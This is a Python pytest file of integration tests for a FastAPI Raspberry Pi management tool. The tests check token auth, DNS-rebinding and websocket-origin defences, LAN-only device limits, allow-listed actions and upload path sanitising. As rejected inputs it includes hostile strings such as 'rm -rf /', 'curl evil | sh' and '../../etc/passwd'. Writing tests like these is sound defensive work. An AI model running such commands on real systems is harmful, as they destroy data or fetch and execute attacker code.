"""FastAPI 端點的整合測試：用 TestClient 打 /api，SSH 與網路一律用假的。"""
import io
import json
import time
from unittest import mock

import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from piscout import app as app_module
from piscout import remote

TOKEN = {"x-piscout-token": app_module.API_TOKEN}
LOCAL = {"host": "127.0.0.1:8000"}  # TestClient 的 websocket 預設 Host 是 testserver
LOGIN = {"username": "pi", "password": "raspberry"}


@pytest.fixture
def client():
    with TestClient(app_module.app, base_url="http://127.0.0.1") as c:
        yield c


@pytest.fixture(autouse=True)
def _clean_state():
    yield
    app_module.SESSIONS.clear()
    app_module.UPLOADS.clear()
    app_module.TERMS.clear()
    app_module.TAPS.clear()


# ------------------------------------------------------------------ guard

def test_api_without_token_is_forbidden(client):
    assert client.get("/api/clipboard").status_code == 403


def test_api_with_wrong_token_is_forbidden(client):
    assert client.get("/api/clipboard", headers={"x-piscout-token": "nope"}).status_code == 403


def test_foreign_host_header_is_forbidden():
    # DNS rebinding：別的網域指向 127.0.0.1 時，Host 不是本機，一律擋掉
    with TestClient(app_module.app, base_url="http://evil.example") as c:
        assert c.get("/", headers=TOKEN).status_code == 403


def test_index_embeds_the_token(client):
    r = client.get("/")
    assert r.status_code == 200
    assert app_module.API_TOKEN in r.text
    assert "__PISCOUT_TOKEN__" not in r.text


# ------------------------------------------------------------------ resolve

@pytest.mark.parametrize("name", ["a..b", "x" * 70 + ".local"])
def test_resolve_malformed_name_is_404_not_500(client, name):
    # 以前 idna 編碼丟的 UnicodeError 沒接住，會變成 500
    r = client.get("/api/resolve", params={"name": name}, headers=TOKEN)
    assert r.status_code == 404


def test_resolve_empty_answer_is_404(client, monkeypatch):
    monkeypatch.setattr(app_module.socket, "getaddrinfo", lambda *a, **k: [])
    r = client.get("/api/resolve", params={"name": "ghost.local"}, headers=TOKEN)
    assert r.status_code == 404


def test_resolve_rejects_blank(client):
    assert client.get("/api/resolve", params={"name": "  "}, headers=TOKEN).status_code == 400


# ------------------------------------------------------------------ 只允許區網位址

@pytest.mark.parametrize("path", ["info", "install", "health", "setup", "addons", "session", "upload"])
def test_device_endpoints_refuse_public_ip(client, path):
    body = dict(LOGIN, kind="terminal", mode="term")
    r = client.post(f"/api/devices/8.8.8.8/{path}", json=body, headers=TOKEN)
    assert r.status_code == 400


def test_device_endpoints_refuse_hostnames(client):
    r = client.post("/api/devices/example.com/info", json=LOGIN, headers=TOKEN)
    assert r.status_code == 400


def test_stats_refuses_public_ip(client):
    assert client.get("/api/devices/1.1.1.1/stats", headers=TOKEN).status_code == 400


# ------------------------------------------------------------------ 只能跑寫死的動作

def test_setup_rejects_unknown_action_before_connecting(client):
    with mock.patch.object(remote, "connect") as connect:
        r = client.post("/api/devices/192.168.1.5/setup",
                        json=dict(LOGIN, action="rm -rf /"), headers=TOKEN)
    assert r.status_code == 400
    connect.assert_not_called()


def test_fleet_rejects_unknown_action(client):
    r = client.post("/api/fleet/action", headers=TOKEN,
                    json={"action": "curl evil | sh", "devices": [{"ip": "192.168.1.5"}]})
    assert r.status_code == 400


def test_fleet_rejects_too_many_devices(client):
    devices = [{"ip": f"192.168.1.{i}"} for i in range(1, 70)]
    r = client.post("/api/fleet/stats", json={"devices": devices}, headers=TOKEN)
    assert r.status_code == 400


def test_fleet_rejects_public_device(client):
    r = client.post("/api/fleet/stats", json={"devices": [{"ip": "8.8.4.4"}]}, headers=TOKEN)
    assert r.status_code == 400


def test_addon_rejects_unknown_id_and_op(client):
    with mock.patch.object(remote, "connect") as connect:
        a = client.post("/api/devices/192.168.1.5/addons/evil/install", json=LOGIN, headers=TOKEN)
        b = client.post("/api/devices/192.168.1.5/addons/docker/explode", json=LOGIN, headers=TOKEN)
    assert a.status_code == 400 and b.status_code == 400
    connect.assert_not_called()


def test_session_rejects_unknown_kind(client):
    r = client.post("/api/devices/192.168.1.5/session", json=dict(LOGIN, kind="shell"), headers=TOKEN)
    assert r.status_code == 400


def test_port_out_of_range_is_422(client):
    r = client.post("/api/devices/192.168.1.5/info", json=dict(LOGIN, port=70000), headers=TOKEN)
    assert r.status_code == 422


def test_remote_flash_needs_risk_ack(client):
    body = {"host": "192.168.1.5", "username": "pi", "image_url": "https://x/y.img.xz",
            "config": {"password": "pw"}}
    assert client.post("/api/flash/remote/start", json=body, headers=TOKEN).status_code == 400


# ------------------------------------------------------------------ vault

@pytest.mark.parametrize("key", ["../../etc", "not-a-mac", "b8:27:eb:00:00"])
def test_vault_rejects_non_mac_keys(client, key):
    with mock.patch.object(app_module.vault, "get") as get:
        r = client.get(f"/api/vault/{key}", headers=TOKEN)
    assert r.status_code in (400, 404)
    get.assert_not_called()


def test_vault_put_normalises_mac(client):
    with mock.patch.object(app_module.vault, "put") as put:
        r = client.put("/api/vault/B8:27:EB:00:00:01", json=LOGIN, headers=TOKEN)
    assert r.status_code == 200
    assert put.call_args[0][0] == "b8:27:eb:00:00:01"


# ------------------------------------------------------------------ SSH 錯誤處理

def test_info_ok(client, monkeypatch):
    fake = mock.MagicMock()
    monkeypatch.setattr(remote, "connect", lambda *a, **k: fake)
    monkeypatch.setattr(remote, "get_info", lambda c: {"model": "Raspberry Pi 4 Model B Rev 1.4"})
    r = client.post("/api/devices/192.168.1.5/info", json=LOGIN, headers=TOKEN)
    assert r.status_code == 200
    assert r.json()["model_id"] == "pi4"
    fake.close.assert_called_once()


def test_info_ssh_failure_is_502(client, monkeypatch):
    def boom(*a, **k):
        raise remote.RemoteError("帳號或密碼不對")
    monkeypatch.setattr(remote, "connect", boom)
    r = client.post("/api/devices/192.168.1.5/info", json=LOGIN, headers=TOKEN)
    assert r.status_code == 502
    assert "密碼" in r.json()["detail"]


def test_stats_bad_json_from_agent_is_502_not_500(client, monkeypatch):
    # 8765 port 上跑的不是我們的 agent，回了 HTML：以前會變成 500
    monkeypatch.setattr(app_module.urllib.request, "urlopen",
                        lambda *a, **k: io.BytesIO(b"<html>hello</html>"))
    r = client.get("/api/devices/192.168.1.5/stats", headers=TOKEN)
    assert r.status_code == 502


def test_stats_unreachable_is_502(client, monkeypatch):
    def refuse(*a, **k):
        raise ConnectionRefusedError()
    monkeypatch.setattr(app_module.urllib.request, "urlopen", refuse)
    assert client.get("/api/devices/192.168.1.5/stats", headers=TOKEN).status_code == 502


def test_stats_ok(client, monkeypatch):
    monkeypatch.setattr(app_module.urllib.request, "urlopen",
                        lambda *a, **k: io.BytesIO(json.dumps({"cpu": 3}).encode()))
    r = client.get("/api/devices/192.168.1.5/stats", headers=TOKEN)
    assert r.status_code == 200 and r.json() == {"cpu": 3}


# ------------------------------------------------------------------ websocket

def _open_terminal_session(client, monkeypatch, ssh):
    monkeypatch.setattr(app_module, "_open_session", lambda host, req: (ssh, None))
    r = client.post("/api/devices/192.168.1.5/session", json=dict(LOGIN, kind="terminal"), headers=TOKEN)
    assert r.status_code == 200
    return r.json()["token"]


def test_websocket_from_foreign_origin_is_refused(client, monkeypatch):
    ssh = mock.MagicMock()
    token = _open_terminal_session(client, monkeypatch, ssh)
    with pytest.raises(WebSocketDisconnect) as e:
        with client.websocket_connect(f"/ws/terminal/{token}", headers={**LOCAL, "origin": "https://evil.example"}):
            pass
    assert e.value.code == 4403
    ssh.invoke_shell.assert_not_called()
    assert token in app_module.SESSIONS  # 被擋的連線不會把別人的 session 吃掉


def test_websocket_with_foreign_host_is_refused(client, monkeypatch):
    ssh = mock.MagicMock()
    token = _open_terminal_session(client, monkeypatch, ssh)
    with pytest.raises(WebSocketDisconnect) as e:
        with client.websocket_connect(f"/ws/terminal/{token}", headers={"host": "evil.example"}):
            pass
    assert e.value.code == 4403
    ssh.invoke_shell.assert_not_called()


def test_websocket_unknown_token_is_refused(client):
    with pytest.raises(WebSocketDisconnect) as e:
        with client.websocket_connect("/ws/terminal/nope", headers=LOCAL):
            pass
    assert e.value.code == 4404


def test_websocket_token_is_single_use_and_kind_checked(client, monkeypatch):
    token = _open_terminal_session(client, monkeypatch, mock.MagicMock())
    with pytest.raises(WebSocketDisconnect):
        with client.websocket_connect(f"/ws/desktop/{token}", headers=LOCAL):
            pass
    assert token not in app_module.SESSIONS


def test_terminal_closes_ssh_when_shell_cannot_open(client, monkeypatch):
    # 以前 invoke_shell 丟例外時，SSH 連線不會被關掉
    ssh = mock.MagicMock()
    ssh.invoke_shell.side_effect = remote.paramiko.SSHException("channel closed")
    token = _open_terminal_session(client, monkeypatch, ssh)
    with client.websocket_connect(f"/ws/terminal/{token}",
                                  headers={**LOCAL, "origin": "http://127.0.0.1:8000"}) as ws:
        with pytest.raises(WebSocketDisconnect) as e:
            ws.receive_bytes()
    assert e.value.code == 1011
    ssh.close.assert_called_once()
    assert "192.168.1.5" not in app_module.TERMS


def test_expired_sessions_are_closed():
    ssh = mock.MagicMock()
    app_module.SESSIONS["old"] = {"client": ssh, "kind": "terminal", "port": None,
                                  "created": time.time() - 3600, "host": "192.168.1.5"}
    app_module._expire_sessions()
    assert "old" not in app_module.SESSIONS
    ssh.close.assert_called_once()


# ------------------------------------------------------------------ upload

class FakeFile:
    def __init__(self):
        self.data = b""

    def set_pipelined(self, _):
        pass

    def write(self, b):
        self.data += b

    def close(self):
        pass


class FakeSftp:
    def __init__(self, rename_error=None):
        self.files, self.renamed, self.removed = {}, [], []
        self.rename_error = rename_error

    def stat(self, path):
        raise IOError("missing")

    def open(self, path, mode):
        self.files[path] = FakeFile()
        return self.files[path]

    def posix_rename(self, a, b):
        if self.rename_error:
            raise self.rename_error
        self.renamed.append((a, b))

    def remove(self, path):
        self.removed.append(path)

    def close(self):
        pass


def _upload(sftp):
    app_module.UPLOADS["t"] = {"client": mock.MagicMock(), "sftp": sftp,
                               "dir": "/home/pi", "used": time.time()}


def test_upload_writes_into_target_dir_only(client):
    sftp = FakeSftp()
    _upload(sftp)
    r = client.post("/api/upload/t", params={"name": "../../etc/passwd"}, content=b"hi", headers=TOKEN)
    assert r.status_code == 200
    assert r.json() == {"path": "/home/pi/passwd", "size": 2}
    assert sftp.renamed == [("/home/pi/passwd.piscout-part", "/home/pi/passwd")]


def test_upload_rejects_dot_names(client):
    _upload(FakeSftp())
    assert client.post("/api/upload/t", params={"name": ".."}, content=b"x", headers=TOKEN).status_code == 400


def test_upload_unknown_token_is_404(client):
    assert client.post("/api/upload/zzz", params={"name": "a"}, content=b"x", headers=TOKEN).status_code == 404


def test_upload_rename_failure_is_502_not_500(client):
    _upload(FakeSftp(rename_error=IOError("Failure")))
    r = client.post("/api/upload/t", params={"name": "a.txt"}, content=b"x", headers=TOKEN)
    assert r.status_code == 502


def test_upload_close_releases_connection(client):
    sftp = FakeSftp()
    _upload(sftp)
    ssh = app_module.UPLOADS["t"]["client"]
    assert client.delete("/api/upload/t", headers=TOKEN).status_code == 200
    ssh.close.assert_called_once()
    assert "t" not in app_module.UPLOADS
